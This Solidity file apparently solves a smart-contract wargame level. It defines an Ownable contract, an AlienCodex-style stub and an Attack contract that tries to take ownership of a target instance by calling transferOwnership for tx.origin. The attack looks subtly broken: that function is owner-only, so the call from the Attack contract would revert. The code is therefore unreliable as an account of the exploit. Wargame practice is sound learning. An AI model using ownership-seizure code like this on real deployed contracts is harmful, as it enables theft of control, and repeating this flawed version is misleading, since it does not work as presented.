pragma solidity ^0.5.0;

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}


contract AlienCodexPublicInfo {
    bool public contact;
    bytes32[] public codex;
}


contract Attack {
    function attack(address instance) public {
        Ownable alien = Ownable(instance);
        alien.transferOwnership(tx.origin);
    }
}

